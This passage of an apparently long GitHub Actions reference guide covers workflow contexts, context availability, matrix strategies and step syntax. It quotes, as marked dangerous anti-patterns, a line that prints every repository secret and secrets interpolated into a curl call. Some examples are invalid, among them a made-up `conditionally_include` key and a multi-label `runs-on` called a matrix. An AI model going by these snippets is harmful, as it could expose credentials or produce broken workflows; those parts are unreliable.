      - [Solutions: Dependency Caching](#solutions-dependency-caching)
      - [Solutions: Matrix Sizing and Concurrency Control](#solutions-matrix-sizing-and-concurrency-control)
      - [Solutions: Identifying Bottlenecks](#solutions-identifying-bottlenecks)
      - [Solutions: Cost Optimization](#solutions-cost-optimization)
      - [Recommended Strategies for Scaling and Optimizing Workflows](#recommended-strategies-for-scaling-and-optimizing-workflows)
      - [1. Maximize job parallelism](#1-maximize-job-parallelism)
      - [2. Use concurrency groups to cancel superseded runs](#2-use-concurrency-groups-to-cancel-superseded-runs)
      - [3. Decompose large workflows — split slow jobs into a separate triggered workflow:](#3-decompose-large-workflows--split-slow-jobs-into-a-separate-triggered-workflow)
      - [4. Use `paths:` filters to skip unnecessary runs](#4-use-paths-filters-to-skip-unnecessary-runs)
      - [7. Summary decision table](#7-summary-decision-table)
    - [11. **Docker and Container Issues**](#11-docker-and-container-issues)
      - [Problem: Docker image push fails](#problem-docker-image-push-fails)
      - [Causes — Docker Push](#causes--docker-push)
      - [Solutions — Docker Push](#solutions--docker-push)
    - [12. **Notification and Rollback Issues**](#12-notification-and-rollback-issues)
      - [Problem: Notifications fail silently](#problem-notifications-fail-silently)
      - [Causes — Notification Failure](#causes--notification-failure)
      - [Solutions — Notification Failure](#solutions--notification-failure)
    - [13. **Quick Troubleshooting Checklist**](#13-quick-troubleshooting-checklist)
  - [Additional Resources](#additional-resources)

---

## Introduction

GitHub Actions is a continuous integration and continuous delivery (CI/CD) platform that allows you to automate your build, test, and deployment pipeline. Workflows are automated processes defined in YAML files that run jobs in response to events in your GitHub repository.

---

## GitHub Actions VS Code Extension & Tooling

The **GitHub Actions VS Code extension** and native YAML schema validation provide rich developer experience for authoring and validating workflows locally before committing.

### Installing and Configuring the Extension

**Installation:**

1. Open VS Code Extensions (Ctrl/Cmd+Shift+X)
2. Search for "GitHub Actions" (publisher: GitHub)
3. Click Install

**Verification:**

```bash
# The extension should appear in your installed extensions list
code --list-extensions | grep -i github
```

### Features and Benefits

| Feature                    | What it provides                                                         |
| -------------------------- | ------------------------------------------------------------------------ |
| **YAML schema validation** | Real-time validation of workflow file structure against GitHub's schema  |
| **Context IntelliSense**   | Auto-complete for `${{ github.* }}`, `secrets.*`, `env.*`, etc.          |
| **Action metadata lookup** | Hover over an action to see its inputs, outputs, and latest version      |
| **Expression evaluation**  | Preview what expressions evaluate to at parse time                       |
| **Error highlighting**     | Immediate feedback on syntax errors, invalid contexts, permission issues |
| **Breadcrumbs navigation** | Easy navigation within large workflow files                              |

### Using Context IntelliSense

**Example: Typing `${{` triggers context suggestions**

```yaml
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - run: echo ${{ github.actor }} # IntelliSense shows available contexts
```

Available contexts include:

- `github.*` — workflow, repository, event info
- `secrets.*` — defined secrets (names only, values not shown)
- `env.*` — workflow and job env vars
- `inputs.*` — workflow_dispatch or workflow_call inputs
- `matrix.*` — matrix strategy values
- `vars.*` — repository and organization variables

### Validating Workflows Locally

**The extension validates against GitHub's official schema**, which includes:

- Valid trigger events and their filters
- Required and optional job properties
- Valid permission scopes
- Action reference syntax (including SHA pinning)
- Context availability at each workflow key

**Red squiggly lines indicate problems** — hover to see details:

```yaml
- uses: actions/checkout@main # ⚠️ Extension may warn if SHA pinning is preferred
  with:
    invalid-input: value # ❌ Extension highlights invalid input
```

### Troubleshooting Extension Issues

**Extension not working?**

1. Ensure `YAML` extension is also installed (often bundled dependency)
2. Verify the workflow file is in `.github/workflows/` or workflow syntax is enabled
3. Check VS Code setting: `"yaml.schemas"` should include GitHub Actions schema
4. Reload VS Code window: Ctrl/Cmd+Shift+P → "Developer: Reload Window"

**To manually add GitHub Actions schema:**

```json
// In your VS Code settings.json
{
  "yaml.schemas": {
    "https://json.schemastore.org/github-workflow.json": ".github/workflows/*.yml"
  }
}
```

### Best Practices for Local Development

- **Commit `.github/workflows/` frequently** — catch issues early via CI
- **Use extension validation before pushing** — reduces failed workflow runs
- **Reference action documentation** — extension shows inputs; always read the action's README for context-specific requirements
- **Test workflow_dispatch inputs** — validate input types and defaults in the extension before deploying to team

---

## Contextual Information in GitHub Workflows

GitHub provides rich contextual information through **contexts** that you can use in your workflows. These contexts contain information about the workflow run, the trigger event, the job, and the runner.

### 1. **github Context**

The `github` context contains information about the workflow run and the event that triggered it.

#### Key Variables in `github` Context

| Variable                  | Description                                                                      | Example                                          |
| ------------------------- | -------------------------------------------------------------------------------- | ------------------------------------------------ |
| `github.action`           | The name of the action currently running                                         | `actions/checkout@v3`                            |
| `github.action_path`      | The path of the action in the repository                                         | `/home/runner/work/_actions/actions/checkout/v3` |
| `github.actor`            | The login of the user that initiated the workflow run                            | `octocat`                                        |
| `github.base_ref`         | The base branch of the pull request                                              | `main`                                           |
| `github.head_ref`         | The head branch of the pull request                                              | `feature-branch`                                 |
| `github.event_name`       | The name of the event that triggered the workflow                                | `push`, `pull_request`, `schedule`               |
| `github.ref`              | The branch or tag ref that triggered the workflow                                | `refs/heads/main`                                |
| `github.ref_name`         | The branch or tag name without `refs/heads/` or `refs/tags/`                     | `main`                                           |
| `github.repository`       | The owner and repository name                                                    | `octocat/Hello-World`                            |
| `github.repository_owner` | The repository owner's login                                                     | `octocat`                                        |
| `github.run_id`           | A unique number for each workflow run within a repository                        | `1296269`                                        |
| `github.run_number`       | A unique number for each run of a particular workflow in a repository            | `3`                                              |
| `github.server_url`       | Returns the URL of the GitHub server                                             | `https://github.com`                             |
| `github.sha`              | The commit SHA that triggered the workflow                                       | `e1c3a851c5caf1e2370a8d9ef4a18a1f6f26f34`        |
| `github.token`            | A token to authenticate on behalf of the GitHub App installed on your repository | (automatically provided)                         |
| `github.workflow`         | The name of the workflow                                                         | `CI`                                             |

#### Example Usage

```yaml
name: Context Example

on: [push, pull_request]

jobs:
  context-demo:
    runs-on: ubuntu-latest
    steps:
      - name: Print GitHub Context
        run: |
          echo "Event Name: ${{ github.event_name }}"
          echo "Actor: ${{ github.actor }}"
          echo "Repository: ${{ github.repository }}"
          echo "Commit SHA: ${{ github.sha }}"
          echo "Branch: ${{ github.ref_name }}"
          echo "Run ID: ${{ github.run_id }}"
```

---

### 2. **env Context**

The `env` context contains environment variables that have been set in a workflow, job, or step.

```yaml
name: Environment Variables Example

env:
  REGISTRY: ghcr.io
  IMAGE_NAME: ${{ github.repository }}

jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - name: Use Environment Variables
        run: |
          echo "Registry: ${{ env.REGISTRY }}"
          echo "Image: ${{ env.IMAGE_NAME }}"
```

---

### 3. **secrets Context**

The `secrets` context contains the names and values of secrets that are available to a workflow run.

```yaml
name: Using Secrets

on: [push]

jobs:
  deploy:
    runs-on: ubuntu-latest
    steps:
      - name: Deploy with Secret
        env:
          DB_PASSWORD: ${{ secrets.DB_PASSWORD }}
        run: |
          echo "Deploying with secure credentials..."
          # Use the secret in your deployment script
```

**Important**: Secrets are never printed to logs. If you accidentally pass a secret to stdout, GitHub will automatically redact it from the logs.

---

### 4. **job Context**

The `job` context contains information about the currently executing job.

| Variable        | Description                                                                  |
| --------------- | ---------------------------------------------------------------------------- |
| `job.container` | Information about the container of the job                                   |
| `job.services`  | The services created for a job in a workflow                                 |
| `job.status`    | The current status of the job (`success`, `failure`, `cancelled`, `skipped`) |

#### Example

```yaml
name: Job Status Example

on: [push]

jobs:
  check-status:
    runs-on: ubuntu-latest
    steps:
      - name: Check Job Status
        run: echo "Job Status: ${{ job.status }}"
```

---

### 5. **runner Context**

The `runner` context contains information about the runner that is executing the current job.

| Variable            | Description                                                                       | Example                     |
| ------------------- | --------------------------------------------------------------------------------- | --------------------------- |
| `runner.name`       | The name of the runner executing the job                                          | `GitHub Actions 1`          |
| `runner.os`         | The operating system of the runner                                                | `Linux`, `Windows`, `macOS` |
| `runner.arch`       | The architecture of the runner                                                    | `X64`, `ARM64`              |
| `runner.temp`       | The path of the temporary directory on the runner                                 | `/home/runner/work/_temp`   |
| `runner.tool_cache` | The path of the directory containing preinstalled tools for GitHub-hosted runners | `/opt/hostedtoolcache`      |
| `runner.workspace`  | The path of the workspace directory                                               | `/home/runner/work`         |

#### Example — Runner Information

```yaml
name: Runner Information

on: [push]

jobs:
  runner-info:
    runs-on: ubuntu-latest
    steps:
      - name: Print Runner Info
        run: |
          echo "Runner OS: ${{ runner.os }}"
          echo "Runner Architecture: ${{ runner.arch }}"
          echo "Temp Directory: ${{ runner.temp }}"
```

---

### 6. **steps Context**

The `steps` context contains information about the steps that have already run in the current job.

```yaml
name: Steps Context Example

on: [push]

jobs:
  step-context-demo:
    runs-on: ubuntu-latest
    steps:
      - name: First Step
        id: first
        run: echo "result=Hello" >> $GITHUB_OUTPUT

      - name: Second Step
        run: echo "Output from first step: ${{ steps.first.outputs.result }}"
```

---

### 7. **matrix Context**

The `matrix` context contains the matrix properties defined in the workflow that apply to the current job. It's used when defining matrix builds.

```yaml
name: Matrix Context Example

on: [push]

jobs:
  build:
    runs-on: ${{ matrix.os }}
    strategy:
      matrix:
        os: [ubuntu-latest, windows-latest, macos-latest]
        node-version: [14, 16, 18]
    steps:
      - name: Print Matrix Context
        run: |
          echo "OS: ${{ matrix.os }}"
          echo "Node Version: ${{ matrix.node-version }}"
```

---

### 8. **inputs Context**

The `inputs` context contains input properties passed to a reusable workflow.

```yaml
name: Workflow triggered with inputs

on:
  workflow_call:
    inputs:
      environment:
        required: true
        type: string

jobs:
  deploy:
    runs-on: ubuntu-latest
    steps:
      - name: Deploy to Environment
        run: echo "Deploying to ${{ inputs.environment }}"
```

---

### 9. **needs Context**

The `needs` context contains outputs from all jobs that are defined as a dependency of the current job.

```yaml
name: Job Dependencies

on: [push]

jobs:
  setup:
    runs-on: ubuntu-latest
    outputs:
      build-id: ${{ steps.build.outputs.id }}
    steps:
      - name: Generate Build ID
        id: build
        run: echo "id=$(date +%s)" >> $GITHUB_OUTPUT

  deploy:
    needs: setup
    runs-on: ubuntu-latest
    steps:
      - name: Deploy with Build ID
        run: echo "Deploying build: ${{ needs.setup.outputs.build-id }}"
```

---

### 10. **strategy Context**

The `strategy` context contains information about the matrix execution strategy for the current job. It is available inside any job that defines a `strategy:` block.

| Property                | Type    | Description                                                           |
| ----------------------- | ------- | --------------------------------------------------------------------- |
| `strategy.fail-fast`    | boolean | Whether the workflow cancels remaining matrix jobs when any job fails |
| `strategy.job-index`    | number  | The 0-based index of the current job in the full set of matrix jobs   |
| `strategy.job-total`    | number  | The total number of jobs in the matrix                                |
| `strategy.max-parallel` | number  | The maximum number of simultaneous matrix jobs allowed                |

```yaml
name: Strategy Context Example

on: [push]

jobs:
  build:
    runs-on: ubuntu-latest
    strategy:
      fail-fast: false
      max-parallel: 2
      matrix:
        os: [ubuntu-latest, windows-latest, macos-latest]
        node: [18, 20]
    steps:
      - name: Print Strategy Context
        run: |
          echo "Job index:    ${{ strategy.job-index }}"
          echo "Total jobs:   ${{ strategy.job-total }}"
          echo "Fail-fast:    ${{ strategy.fail-fast }}"
          echo "Max parallel: ${{ strategy.max-parallel }}"

      - name: Only on first matrix job
        if: strategy.job-index == 0
        run: echo "This step only runs on the first matrix combination"
```

**Key use-cases:**

- `strategy.job-index == 0` — run a setup or notification step only once across the entire matrix
- `strategy.job-total` — display progress ("job 2 of 6")
- `strategy.fail-fast` — surface the effective fail-fast setting in logs for debugging

---

## Context Availability Reference

This section shows which contexts can be used in different parts of a GitHub workflow file. Understanding context availability is crucial for proper workflow configuration.

### Contexts by Workflow Key

| Workflow Key                               | Available Contexts                                                                                    | Special Functions                                                  | Notes                                       |
| ------------------------------------------ | ----------------------------------------------------------------------------------------------------- | ------------------------------------------------------------------ | ------------------------------------------- |
| `run-name`                                 | `github`, `inputs`, `vars`                                                                            | None                                                               | Runs at workflow initialization             |
| `concurrency`                              | `github`, `inputs`, `vars`                                                                            | None                                                               | Used to manage concurrent workflow runs     |
| `env`                                      | `github`, `inputs`, `vars`                                                                            | None                                                               | Workflow-level environment variables        |
| `defaults.run.shell`                       | `github`, `inputs`, `vars`                                                                            | None                                                               | Static configuration, no special evaluation |
| `defaults.run.working-directory`           | `github`, `inputs`, `vars`                                                                            | None                                                               | Static configuration                        |
| `jobs.<job_id>.name`                       | `github`, `inputs`, `vars`                                                                            | None                                                               | Job display name                            |
| `jobs.<job_id>.if`                         | `github`, `secrets`, `inputs`, `vars`, `needs`                                                        | `always()`, `success()`, `failure()`, `cancelled()`, `hashFiles()` | Conditional job execution                   |
| `jobs.<job_id>.runs-on`                    | `github`, `inputs`, `vars`                                                                            | None                                                               | Runner selection                            |
| `jobs.<job_id>.environment`                | `github`, `inputs`, `vars`                                                                            | None                                                               | Environment name selection                  |
| `jobs.<job_id>.outputs`                    | `github`, `inputs`, `vars`, `needs`, `steps`                                                          | None                                                               | Job output definitions                      |
| `jobs.<job_id>.strategy.matrix`            | `github`, `inputs`, `vars`                                                                            | None                                                               | Matrix strategy values                      |
| `jobs.<job_id>.steps[*].name`              | `github`, `env`, `secrets`, `inputs`, `vars`, `needs`, `job`, `runner`, `strategy`, `matrix`, `steps` | None                                                               | Step display name                           |
| `jobs.<job_id>.steps[*].if`                | `github`, `env`, `secrets`, `inputs`, `vars`, `needs`, `job`, `runner`, `strategy`, `matrix`, `steps` | `always()`, `success()`, `failure()`, `cancelled()`, `hashFiles()` | Conditional step execution                  |
| `jobs.<job_id>.steps[*].uses`              | `github`, `inputs`, `vars`                                                                            | None                                                               | Action selection (limited context)          |
| `jobs.<job_id>.steps[*].run`               | `github`, `env`, `secrets`, `inputs`, `vars`, `needs`, `job`, `runner`, `strategy`, `matrix`, `steps` | None                                                               | Shell script execution                      |
| `jobs.<job_id>.steps[*].with`              | `github`, `env`, `secrets`, `inputs`, `vars`, `needs`, `job`, `runner`, `strategy`, `matrix`, `steps` | None                                                               | Action input parameters                     |
| `jobs.<job_id>.steps[*].env`               | `github`, `env`, `secrets`, `inputs`, `vars`, `needs`, `job`, `runner`, `strategy`, `matrix`, `steps` | None                                                               | Step-level environment variables            |
| `jobs.<job_id>.steps[*].working-directory` | `github`, `env`, `inputs`, `vars`                                                                     | None                                                               | Working directory for run step              |
| `jobs.<job_id>.container`                  | `github`, `inputs`, `vars`                                                                            | None                                                               | Container image and options                 |
| `jobs.<job_id>.services.<service_id>`      | `github`, `inputs`, `vars`                                                                            | None                                                               | Service container configuration             |
| `jobs.<job_id>.timeout-minutes`            | `github`, `inputs`, `vars`                                                                            | None                                                               | Job timeout duration                        |

### Contexts by Scope

#### Workflow-Level Contexts

These contexts are available throughout the workflow:

```yaml
- github: Available everywhere
- inputs: Available everywhere (for workflows with inputs)
- vars: Available everywhere
- secrets: Available in jobs and steps (not in workflow-level keys)
```

#### Job-Level Contexts

These contexts are available within job and step configurations:

```yaml
- needs: Available after job dependencies
- job: Available within job steps
- runner: Available within job steps
- strategy: Available for matrix builds
- matrix: Available for matrix jobs
```

#### Step-Level Contexts

Full context availability within step execution:

```yaml
- env: Current and workflow-level environment variables
- secrets: All available secrets
- steps: Outputs from previous steps
```

### Usage Examples

#### Example 1: Using Contexts at Workflow Level

```yaml
name: ${{ github.event_name }} - Workflow
run-name: Run #${{ github.run_number }} of ${{ github.repository }}

on:
  push:
    branches: [main]
  workflow_dispatch:
    inputs:
      environment:
        required: true
        type: choice
        options: [dev, staging, prod]

concurrency:
  group: ${{ github.workflow }}-${{ github.ref }}
  cancel-in-progress: true

env:
  REGISTRY: ghcr.io
  IMAGE_NAME: ${{ github.repository }}
```

#### Example 2: Using Contexts at Job Level

```yaml
jobs:
  build:
    name: Build for ${{ matrix.os }}
    runs-on: ${{ matrix.os }}
    if: github.event_name == 'push' || github.event.pull_request.draft == false
    strategy:
      matrix:
        os: [ubuntu-latest, windows-latest]
    steps:
      - run: echo "Building on ${{ matrix.os }}"
```

#### Example 3: Using Contexts at Step Level

```yaml
jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v3
        with:
          ref: ${{ github.head_ref || github.ref_name }}

      - name: Conditional step
        if: success() && github.event_name == 'push'
        env:
          DEPLOY_KEY: ${{ secrets.DEPLOY_KEY }}
          RUN_ID: ${{ github.run_id }}
          BUILD_NUMBER: ${{ github.run_number }}
        run: |
          echo "Run ID: $RUN_ID"
          echo "Build: $BUILD_NUMBER"
```

#### Example 4: Cross-Job Context Usage with needs

```yaml
jobs:
  setup:
    runs-on: ubuntu-latest
    outputs:
      version: ${{ steps.version.outputs.value }}
    steps:
      - id: version
        run: echo "value=$(date +%Y.%m.%d)" >> $GITHUB_OUTPUT

  deploy:
    needs: setup
    runs-on: ubuntu-latest
    if: success() # Job-level context
    steps:
      - name: Deploy
        run: echo "Deploying version ${{ needs.setup.outputs.version }}"
        env:
          DEPLOY_VERSION: ${{ needs.setup.outputs.version }}
```

### Important Notes on Context Availability

#### 1. Secret Redaction

Secrets are never available at certain levels to prevent accidental exposure:

- Not available in `uses` (action selection)
- Always redacted in logs if accidentally output

### 2. Limited Context in Dynamic Action Selection

```yaml
# ❌ This will NOT work as expected
- uses: ${{ github.event_name == 'push' && 'actions/checkout@v3' || 'actions/download-artifact@v3' }}

# ✅ Use if condition instead
- uses: actions/checkout@v3
  if: github.event_name == 'push'
```

#### 3. Matrix Context Availability

The `matrix` context is only available within the job where it's defined:

```yaml
strategy:
  matrix:
    os: [ubuntu-latest, windows-latest]
    node: [16, 18]

steps:
  - run: echo "OS: ${{ matrix.os }}, Node: ${{ matrix.node }}"  # ✓ Works

other-job:
  steps:
    - run: echo "OS: ${{ matrix.os }}"  # ✗ Does not work, no matrix in this job
```

#### 4. Passing Context Between Jobs

To use values from one job in another, use job outputs:

```yaml
jobs:
  job1:
    outputs:
      value: ${{ steps.step.outputs.result }}

  job2:
    needs: job1
    steps:
      - run: echo ${{ needs.job1.outputs.value }}
```

### 5. Static vs Runtime Expression Evaluation

GitHub Actions evaluates expressions in two phases:

- **Static (parse-time) evaluation** — happens before any runner is assigned. Only a limited set of contexts (`github`, `inputs`, `vars`) are available. Fields like `runs-on:`, `uses:`, `if:` at the job level, and `strategy.matrix` are evaluated statically.
- **Runtime evaluation** — happens on the runner during job execution. Full context access (`env`, `secrets`, `job`, `runner`, `steps`, `matrix`, `needs`, `strategy`) is available in `run:`, `with:`, step-level `if:`, and `env:` blocks.

```yaml
# ❌ FAILS — 'env' context is not available at static parse time for 'runs-on'
jobs:
  build:
    runs-on: ${{ env.RUNNER_LABEL }}  # parse-time: only github/inputs/vars allowed

# ✅ WORKS — use 'vars' context (available at parse time) or a literal value
jobs:
  build:
    runs-on: ${{ vars.RUNNER_LABEL }}  # vars is evaluated statically

# ✅ WORKS — secrets available in 'run:' (runtime) but NOT in 'uses:' (static)
steps:
  - uses: actions/checkout@v4   # 'secrets' NOT available here
  - run: echo "$MY_TOKEN"       # 'secrets' IS available here (passed via env)
    env:
      MY_TOKEN: ${{ secrets.GH_TOKEN }}
```

### 6. Secret Leakage Prevention in Expressions

Secrets are automatically masked in logs, but certain patterns can still expose them:

```yaml
# ❌ DANGEROUS — interpolating secrets directly into 'run:' embeds the value
# in the shell command line, which can appear in process lists or debug output
- run: curl -H "Authorization: Bearer ${{ secrets.API_TOKEN }}" https://api.example.com

# ✅ SAFE — pass secrets via environment variables (the value is passed out of
# the rendered script and into the process environment by the runner agent)
- run: curl -H "Authorization: Bearer $API_TOKEN" https://api.example.com
  env:
    API_TOKEN: ${{ secrets.API_TOKEN }}

# ❌ DANGEROUS — toJSON(secrets) prints ALL secret names and values as JSON
- run: echo '${{ toJSON(secrets) }}'

# ❌ DANGEROUS — using add-mask to re-mask a secret that leaked into a variable
# is a workaround, not a substitute for proper env-var passing
```

**Key rules:**

- Never write `${{ secrets.X }}` inside a `run:` block — always map to an `env:` variable first
- Never use `toJSON(secrets)` in any output or log step
- Use `::add-mask::` only as a last resort to suppress accidental exposures; it does not prevent the value from being passed to processes
- Secrets are automatically redacted from logs but not from external HTTP requests made by your scripts

---

## GitHub Workflow File Structure

A GitHub workflow file is a YAML file that defines one or more jobs. This section explains all the components and their purposes.

### 1. **Basic Structure**

```yaml
name: Workflow Name

on: [event] # Trigger events

env: # Environment variables
  VARIABLE_NAME: value

jobs:
  job-id:
    runs-on: runner
    steps:
      - uses: action-name@version
      - run: command
```

---

### 2. **name**

The name of your workflow. It's displayed on your repository's "Actions" page.

```yaml
name: CI/CD Pipeline
```

---

### 3. **on** (Events)

Specifies the events that trigger the workflow. Can be a single event or multiple events.

#### Common Trigger Events

```yaml
# Single event
on: push

# Multiple events
on: [push, pull_request]

# Event with specific filters
on:
  push:
    branches:
      - main
      - develop
    paths:
      - 'src/**'
      - 'package.json'
  pull_request:
    branches: [main]

# Scheduled event (cron)
on:
  schedule:
    - cron: '0 0 * * *'  # Daily at midnight

# Manual trigger
on: workflow_dispatch

# External trigger
on:
  workflow_run:
    workflows: ["Deploy"]
    types: [completed]
```

---

### 4. **env**

Environment variables that are available to all jobs and steps in the workflow.

```yaml
env:
  NODE_ENV: production
  DATABASE_URL: ${{ secrets.DATABASE_URL }}
  CACHE_DIR: ./cache
```

---

### 5. **defaults**

Default settings for all jobs in the workflow.

```yaml
defaults:
  run:
    shell: bash
    working-directory: ./src
```

---

### 6. **concurrency**

Ensures that only a single job or workflow using the same concurrency group will run at a time.

```yaml
concurrency:
  group: ${{ github.workflow }}-${{ github.ref }}
  cancel-in-progress: true
```

---

### 7. **jobs**

A workflow run is made up of one or more jobs. Jobs run in parallel by default, unless configured otherwise.

```yaml
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v3

  test:
    needs: build # This job depends on 'build'
    runs-on: ubuntu-latest
    steps:
      - run: npm test
```

#### Job Properties

##### **name**

The display name of your job.

```yaml
jobs:
  test:
    name: Run Tests
    runs-on: ubuntu-latest
```

##### **runs-on**

The type of machine to run the job on.

```yaml
runs-on: ubuntu-latest
# or
runs-on: [ubuntu-latest, windows-latest]  # Matrix
# or
runs-on: self-hosted  # Self-hosted runner
```

##### **environment**

The environment that the job references.

```yaml
jobs:
  deploy:
    environment: production
    runs-on: ubuntu-latest
```

##### **outputs**

A map of outputs for a job. Job outputs are available to all downstream jobs that depend on this job.

```yaml
jobs:
  setup:
    runs-on: ubuntu-latest
    outputs:
      version: ${{ steps.vars.outputs.version }}
    steps:
      - id: vars
        run: echo "version=$(date +%Y.%m.%d)" >> $GITHUB_OUTPUT

  deploy:
    needs: setup
    runs-on: ubuntu-latest
    steps:
      - run: echo "Deploying version ${{ needs.setup.outputs.version }}"
```

##### **strategy**

Used for matrix builds and other strategies.

```yaml
strategy:
  matrix:
    node-version: [14, 16, 18]
    os: [ubuntu-latest, windows-latest]
  max-parallel: 2
  fail-fast: false
```

**Matrix with `include` and `exclude`:**

`include` adds extra combinations or extends existing ones. `exclude` removes specific combinations from the matrix.

```yaml
jobs:
  build:
    strategy:
      fail-fast: false
      max-parallel: 4
      matrix:
        os: [ubuntu-latest, windows-latest, macos-latest]
        node: [18, 20]
        # exclude an unsupported combination
        exclude:
          - os: windows-latest
            node: 18
        # include an extra combination with additional variables
        include:
          - os: ubuntu-latest
            node: 22
            experimental: true
          - os: macos-latest
            node: 20
            extra-flag: "--arm64"
    runs-on: ${{ matrix.os }}
    continue-on-error: ${{ matrix.experimental == true }}
    steps:
      - uses: actions/checkout@v3
      - run: echo "Node ${{ matrix.node }} on ${{ matrix.os }}"
```

**`fail-fast`** (default `true`): When `true`, GitHub cancels all in-progress matrix jobs if any job fails. Set to `false` to let all combinations run regardless.

**`max-parallel`**: Limits how many matrix jobs run concurrently. Reduces resource usage and cost.

**Selectively Re-running Individual Matrix Jobs:**

In the GitHub UI, after a workflow run with matrix jobs, you can re-run specific failed jobs instead of the entire matrix:

- Navigate to the workflow run
- Click the failed job
- Click **Re-run jobs > Re-run failed jobs** (re-runs only the failed matrix variants)

```yaml
# Matrix with OS-specific runner image notes:
strategy:
  matrix:
    os:
      # ubuntu-20.04 is deprecated; migrate to ubuntu-22.04 or ubuntu-latest
      - ubuntu-22.04
      # windows-latest points to Windows Server 2025 as of 2025
      - windows-latest
      - macos-latest
```

**Dynamic Matrix from JSON:**

```yaml
jobs:
  setup:
    runs-on: ubuntu-latest
    outputs:
      matrix: ${{ steps.set-matrix.outputs.matrix }}
    steps:
      - id: set-matrix
        run: |
          echo 'matrix={"include":[{"project":"foo","config":"a"},{"project":"bar","config":"b"}]}' >> $GITHUB_OUTPUT

  build:
    needs: setup
    runs-on: ubuntu-latest
    strategy:
      matrix: ${{ fromJSON(needs.setup.outputs.matrix) }}
    steps:
      - run: echo "Building ${{ matrix.project }} with config ${{ matrix.config }}"
```

**Matrix Cost Optimization and Deprecation Migration:**

Matrix builds multiply the number of jobs, increasing costs. For example, a 3×4 matrix (3 OS × 4 Node versions) = 12 parallel jobs.

**Cost Estimation:**

```yaml
# ❌ EXPENSIVE: 3 OS × 4 Node × 2 architectures = 24 jobs
strategy:
  matrix:
    os: [ubuntu-latest, windows-latest, macos-latest]
    node: [18, 19, 20, 21]
    arch: [x64, arm64]

# ✅ OPTIMIZED: ~8 jobs (exclude expensive combinations, reduce scope)
strategy:
  fail-fast: false
  max-parallel: 3  # Limit parallel jobs to reduce per-run cost
  matrix:
    include:
      # Test critical combinations only
      - os: ubuntu-latest
        node: 18
      - os: ubuntu-latest
        node: 21
      - os: windows-latest
        node: 20
      - os: macos-latest
        node: 20
      # Nightly extended matrix (use schedule trigger)
```

**GitHub-Hosted Runner Costs (approximate, 2026):**

- `ubuntu-latest`: Base cost (included in Actions minutes)
- `windows-latest`: 2x cost multiplier
- `macos-latest`: 10x cost multiplier

**Strategy examples by cost sensitivity:**

```yaml
# For open-source projects (cost-sensitive)
strategy:
  matrix:
    node: [18, 21]  # Only LTS + latest versions
    # Skip rare platforms, just test on ubuntu-latest
runs-on: ubuntu-latest

# For paid organizations (comprehensive testing)
strategy:
  fail-fast: false
  matrix:
    os: [ubuntu-latest, windows-latest, macos-latest]
    node: [18, 19, 20, 21]

# For enterprise (selective by branch)
strategy:
  matrix:
    include:
      # PR checks: minimal testing
      - { os: ubuntu-latest, node: 20 }
      # Main branch: comprehensive testing
      - { os: ubuntu-latest, node: 18 }
      - { os: ubuntu-latest, node: 21 }
      - { os: windows-latest, node: 20 }
      - { os: macos-latest, node: 20 }
conditionally_include: ${{ github.event_name == 'push' && github.ref == 'refs/heads/main' }}
```

**Runner Image Deprecation: Ubuntu 20.04 and windows-latest:**

**Ubuntu 20.04 Deprecation (as of March 2024):**

- `ubuntu-20.04` is no longer supported on GitHub-hosted runners
- **Action required**: Migrate workflows to `ubuntu-22.04` or `ubuntu-latest` (currently 24.04)

```yaml
# ❌ WILL FAIL
jobs:
  build:
    runs-on: ubuntu-20.04

# ✅ MIGRATE TO
jobs:
  build:
    runs-on: ubuntu-22.04  # or ubuntu-latest
```

**windows-latest Transition (Windows Server 2025):**

- As of March 2025, `windows-latest` points to Windows Server 2025
- `windows-2022` remains available
- Test for compatibility:
  - PowerShell version changes (7.4+ vs 7.1)
  - .NET runtime differences
  - Build tool versions

```yaml
strategy:
  matrix:
    os:
      - ubuntu-latest # Currently 24.04
      - windows-2022 # Stable, known versions
      - windows-latest # Windows Server 2025 (test for compat)
      - macos-latest # Currently macOS 14
```

**Deprecation Action Checklist:**

- [ ] Audit all workflows for `ubuntu-20.04` references
- [ ] Replace with `ubuntu-22.04` or `ubuntu-latest`
- [ ] Test `windows-latest` against Windows Server 2025 breaking changes
- [ ] Pin specific runner versions for production workflows: `ubuntu-22.04`, `windows-2022`, `macos-13`
- [ ] Update CI/CD docs with current runner image versions

##### **if**

Prevents a job from running unless a condition is met.

```yaml
jobs:
  deploy:
    if: github.ref == 'refs/heads/main' && github.event_name == 'push'
    runs-on: ubuntu-latest
```

##### **steps**

A sequence of tasks that will be executed as part of the job.

```yaml
steps:
  - uses: actions/checkout@v3
  - run: npm install
  - run: npm run build
```

---

### 8. **Steps**

Steps are individual tasks that run sequentially within a job. Each step can run a script or an action.

#### Step Properties

##### **name** — Step Property

The name of the step.

```yaml
- name: Install dependencies
  run: npm install
```

##### **uses**

Selects an action to run as part of a step.

```yaml
- uses: actions/checkout@v3
  with:
    ref: main
    fetch-depth: 0
```

##### **run**

Runs command-line programs using the operating system's shell.

```yaml
- run: npm run build
  shell: bash
  working-directory: ./src
```

##### **with**

Input parameters defined by the action.

```yaml
- uses: docker/build-push-action@v4
  with:
    context: .
    push: true
    tags: myimage:latest
```

##### **env**

Environment variables specific to this step.

```yaml
- name: Deploy
  env:
    DEPLOY_KEY: ${{ secrets.DEPLOY_KEY }}
  run: ./deploy.sh
```

##### **if** — Step Condition

Conditional execution of a step.

```yaml
- name: Notify Slack
  if: failure()
  run: curl -X POST ${{ secrets.SLACK_WEBHOOK }}
```

##### **id**

A unique identifier for the step. Used to reference outputs from this step in other steps.

```yaml
- name: Build
  id: build
  run: npm run build

- name: Check Build Size
  run: ls -lah dist/
```

##### **timeout-minutes**

The maximum number of minutes to run the step before GitHub terminates the process.

```yaml
- name: Long-running task
  run: ./long-process.sh
  timeout-minutes: 60
```

##### **continue-on-error**

Prevents a job from failing when a step fails.

```yaml
- name: Test
  run: npm test
  continue-on-error: true
```

---

### 9. **Container**

Run Steps or Actions in a Docker container.

```yaml
jobs:
  build:
    runs-on: ubuntu-latest
    container:
      image: node:18
      env:
        NODE_ENV: development
      options: --cpus 1
    steps:
      - uses: actions/checkout@v3
      - run: npm install
```

---

### 10. **services**

Service containers run additional Docker containers alongside job steps, providing dependent services like databases, caches, and message queues. They are started before job steps and stopped after, and are accessible via `localhost` or by their service ID as hostname.

**Full Service Container Configuration Options:**

| Option        | Description                                            |
| ------------- | ------------------------------------------------------ |
